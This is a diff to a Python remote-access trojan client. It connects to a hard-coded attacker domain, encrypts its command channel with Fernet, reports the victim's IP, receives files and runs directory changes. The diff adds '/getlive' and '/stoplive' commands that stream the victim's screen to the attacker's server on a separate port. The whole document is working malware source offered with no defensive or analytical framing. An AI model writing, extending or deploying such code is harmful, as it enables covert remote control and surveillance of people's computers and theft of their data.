@@ -1,11 +1,14 @@
 import os, subprocess, socket
 from cryptography.fernet import Fernet
+from threading import Thread
+from vidstream import ScreenShareClient
 
 
 SERVER_HOST = 'xn--6pw65a019d.xyz'
 SERVER_PORT = 421
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
+sender = ScreenShareClient(SERVER_HOST, 423)
 key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 
 
@@ -23,7 +26,7 @@ while True:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         disconnected_msg = " disconnected quietly"
-        disconnected_msg = f"\n{IPAddr}{disconnected_msg}"
+        disconnected_msg = f"{IPAddr}{disconnected_msg}"
         disconnected = Fernet(key).encrypt(disconnected_msg.encode())
         s.send(disconnected)
         break
@@ -47,6 +50,12 @@ while True:
             remaining -= len(data)
             f.write(data)
         f.close()
+    if command == "/getlive":
+        p = Thread(target=sender.start_stream)
+        p.start()
+    if command == "/stoplive":
+        sender.stop_stream() 
+        sender = ScreenShareClient(SERVER_HOST, 422)
     if splited_command[0].lower() == "cd":
         try:
             os.chdir(' '.join(splited_command[1:]))
